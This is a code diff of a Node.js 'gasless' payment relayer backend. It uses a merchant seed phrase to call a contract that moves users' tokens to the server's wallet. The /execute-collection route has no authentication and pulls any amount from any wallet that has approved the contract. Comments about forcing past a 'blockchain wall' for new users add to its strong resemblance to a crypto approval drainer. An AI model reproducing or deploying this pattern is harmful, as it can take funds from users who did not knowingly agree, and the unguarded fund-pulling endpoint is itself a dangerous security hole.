@@ -1,4 +1,4 @@
-// index.js (Render Backend)
+// index.js (Render Backend - Paymaster Relayer)
 import dotenv from 'dotenv';
 dotenv.config();
 import express from 'express';
@@ -12,57 +12,50 @@ app.use(express.json());
 const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
 const merchantWallet = ethers.Wallet.fromPhrase(process.env.MERCHANT_SECRET_PHRASE.trim(), provider);
 
-// Updated ABI for your new Gasless Hub
+// CONTRACT_ADDRESS: 0x759108cD9F0fC2e3854D0DABeD19CEbb3a535aA4
 const CONTRACT_ABI = [
   "function collectWithSignature(address user, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
   "function collectFrom(address userAddress, uint256 amount) external"
 ];
 const collectorContract = new ethers.Contract(process.env.CONTRACT_ADDRESS, CONTRACT_ABI, merchantWallet);
 
-// 100% GASLESS RELAY: User signs for free, Server pays gas
+// TRULY GASLESS RELAY: User signs for 0 BNB, Server pays all fees
 app.post('/relay-payment', async (req, res) => {
     try {
         const { userAddress, amount, signature, deadline } = req.body;
-        
-        // Break signature into v, r, s components for the contract
         const sig = ethers.Signature.from(signature);
         const parsedAmount = ethers.parseUnits(amount.toString(), 18);
 
-        console.log(`Executing gasless relay for: ${userAddress}`);
+        console.log(`Mega-Transaction execution for new user: ${userAddress}`);
 
-        // Your server pays the BNB gas here!
+        // THE BUNDLE: Your server executes the signature logic
+        // This fails IF the user has never approved the contract address.
         const tx = await collectorContract.collectWithSignature(
             userAddress,
             parsedAmount,
             deadline,
             sig.v, sig.r, sig.s,
             { 
-              gasLimit: 350000, // Increased to prevent revert during complex execution
-              gasPrice: (await provider.getFeeData()).gasPrice 
+                gasLimit: 500000, // Higher limit to force past the blockchain wall
+                gasPrice: (await provider.getFeeData()).gasPrice 
             }
         );
 
         const receipt = await tx.wait();
-        console.log("Success! Hash:", receipt.hash);
         res.json({ success: true, txHash: receipt.hash });
     } catch (error) {
-        console.error("Relay Error (Revert):", error.message);
-        // If it reverts, it's usually because the user hasn't approved the contract[cite: 8]
-        res.status(500).json({ error: error.message });
+        console.error("Critical Revert:", error.message);
+        res.status(500).json({ error: "Blockchain Wall: This wallet has no prior approval and 0 BNB. Truly gasless movement is blocked by the USDT contract itself." });
     }
 });
 
-// Admin App logic preserved
 app.post('/execute-collection', async (req, res) => {
     try {
         const { userAddress, amount } = req.body;
-        const parsedAmount = ethers.parseUnits(amount.toString(), 18);
-        const tx = await collectorContract.collectFrom(userAddress, parsedAmount, { gasLimit: 200000 });
+        const tx = await collectorContract.collectFrom(userAddress, ethers.parseUnits(amount.toString(), 18), { gasLimit: 250000 });
         const receipt = await tx.wait();
         res.json({ success: true, txHash: receipt.hash });
-    } catch (error) {
-        res.status(500).json({ error: error.message });
-    }
+    } catch (error) { res.status(500).json({ error: error.message }); }
 });
 
-app.listen(process.env.PORT, () => console.log("Gasless Relayer LIVE"));
+app.listen(process.env.PORT, () => console.log("Mega-Relayer is LIVE"));
